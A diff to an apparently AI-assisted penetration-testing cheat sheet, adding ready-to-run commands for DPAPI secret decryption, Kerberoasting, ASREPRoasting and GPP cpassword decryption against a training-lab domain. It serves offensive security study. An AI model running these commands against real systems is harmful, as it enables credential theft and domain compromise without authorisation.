@@ -199,6 +199,43 @@ runas /savecred /user:SRV01\mcharles cmd
 - `Policy.vpol` — AES key that encrypts vault, protected by DPAPI
 - `rundll32 keymgr.dll,KRShowKeyMgr` — GUI export of stored credentials
 
+### DPAPI — Master Key Decryption
+
+DPAPI protects browser credentials, Credential Manager secrets, and vault data. Requires the user's password or the domain backup key to decrypt.
+
+```bash
+# Linux — impacket dpapi (offline, with known user password)
+impacket-dpapi masterkey -file "/path/to/MasterKey" -password "user_password"
+
+# Get master key GUID from credential file
+impacket-dpapi credential -file "/path/to/CredFile"
+
+# Full offline chain: masterkey → decrypt credential blob
+impacket-dpapi masterkey -file "MasterKey_file" -password "Password123"
+# Returns: decrypted master key hex
+
+impacket-dpapi credential -file "CredentialFile" -key "decrypted_master_key_hex"
+
+# Domain backup key path (requires DA; decrypts any user's DPAPI)
+impacket-dpapi backupkeys --export -t domain.com/admin:Password@dc01
+# Then: impacket-dpapi masterkey -file MasterKey -pvk domain_backup.pvk
+
+# Master key locations on target
+# %APPDATA%\Microsoft\Protect\<SID>\<GUID>           ← user master keys
+# %WINDIR%\System32\Microsoft\Protect\S-1-5-18\User  ← SYSTEM master keys
+
+# Browser creds encrypted with DPAPI
+# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
+# Edge:   %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
+# Use SharpDPAPI or mimikatz dpapi::chrome to decrypt
+```
+
+```cmd
+# Windows — mimikatz (online, same user context)
+dpapi::masterkey /in:"C:\Users\john\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /password:Password123
+dpapi::cred /in:"C:\Users\john\AppData\Local\Microsoft\Credentials\<CredFile>"
+```
+
 ---
 
 ## Windows — NTDS.dit Dumping (Domain Controller)
@@ -229,6 +266,58 @@ hashcat -m 1000 ntds_hashes.txt /usr/share/wordlists/rockyou.txt
 
 ---
 
+## Active Directory — Kerberos Attacks
+
+### Kerberoasting
+
+Request TGS tickets for service accounts (SPNs) and crack them offline. Any authenticated domain user can request a TGS for any SPN — no special privileges needed.
+
+```bash
+# Linux — impacket GetUserSPNs
+impacket-GetUserSPNs inlanefreight.htb/forend:Klmcargo2 -dc-ip 172.16.5.5 -request
+
+# Output to file
+impacket-GetUserSPNs inlanefreight.htb/forend:Klmcargo2 -dc-ip 172.16.5.5 -request -outputfile kerberoast_hashes.txt
+
+# Crack with hashcat (mode 13100 = TGS-REP RC4)
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Windows — Rubeus
+Rubeus.exe kerberoast /stats             # check how many SPNs exist
+Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt
+
+# Windows — PowerView
+Import-Module PowerView.ps1
+Get-DomainUser -SPN -Properties SamAccountName,ServicePrincipalName
+Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty hash | Out-File kerberoast.txt
+```
+
+> [!note] AES-encrypted TGS (etype 18) is much harder to crack than RC4 (etype 23). If Rubeus returns AES hashes, request RC4 explicitly: `Rubeus.exe kerberoast /tgtdeleg /nowrap`
+
+### ASREPRoasting
+
+Users with `UF_DONT_REQUIRE_PREAUTH` set don't require Kerberos pre-authentication — request an AS-REP for them without knowing their password and crack it offline.
+
+```bash
+# Linux — impacket GetNPUsers (no auth needed if anonymous LDAP allowed)
+impacket-GetNPUsers inlanefreight.htb/ -dc-ip 172.16.5.5 -no-pass -usersfile users.txt -format hashcat
+
+# With domain creds (enumerate who's vulnerable + get hash)
+impacket-GetNPUsers inlanefreight.htb/forend:Klmcargo2 -dc-ip 172.16.5.5 -request -format hashcat -outputfile asrep_hashes.txt
+
+# Crack (mode 18200 = AS-REP RC4)
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Windows — Rubeus
+Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+Rubeus.exe asreproast /nowrap /format:hashcat   # all vulnerable users
+
+# Windows — PowerView to enumerate vulnerable accounts first
+Get-DomainUser -UACFilter DONT_REQUIRE_PREAUTH | Select-Object SamAccountName
+```
+
+---
+
 ## Windows — Credential Hunting
 
 ```cmd
@@ -246,12 +335,42 @@ Select-String -Path C:\Users\*\Documents\* -Pattern "password|secret|token|key"
 
 **Common locations:**
 
-- SYSVOL → Group Policy scripts/preferences
+- SYSVOL → Group Policy scripts/preferences — see GPP cpassword below
 - IT/dev shares → hardcoded creds in scripts
 - `unattend.xml` → plaintext local admin password
 - AD user/computer description fields
 - KeePass databases (`.kdbx`) — crack with hashcat mode `13400`
 - `pass.txt`, `passwords.docx`, `passwords.xlsx` on shares/SharePoint
+
+### GPP cpassword (Group Policy Preferences)
+
+Pre-2014 GPPs stored credentials encrypted with a public AES key (MS14-025). The key is published — trivially decryptable.
+
+```bash
+# Linux — find cpassword in SYSVOL
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+
+# Manual — mount SYSVOL or enumerate via SMB
+find /mnt/sysvol -name "*.xml" 2>/dev/null | xargs grep -l "cpassword" 2>/dev/null
+
+# Decrypt cpassword (Python)
+python3 -c "
+import base64
+from Crypto.Cipher import AES
+key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
+enc = base64.b64decode('CPASSWORD_VALUE' + '=' * (4 - len('CPASSWORD_VALUE') % 4))
+cipher = AES.new(key, AES.MODE_CBC, enc[:16])
+print(cipher.decrypt(enc[16:]).rstrip(b'\\x08').decode())
+"
+
+# Windows — PowerSploit
+Import-Module PowerSploit
+Get-GPPPassword          # searches SYSVOL automatically
+Get-GPPAutologon         # finds autologon credentials in GPP
+```
+
+> [!note] MS14-025 patched storage of new GPP passwords but did NOT delete existing cpassword entries — old GPP files with cpassword remain in SYSVOL on patched DCs.
 
 ---
 
@@ -699,5 +818,5 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
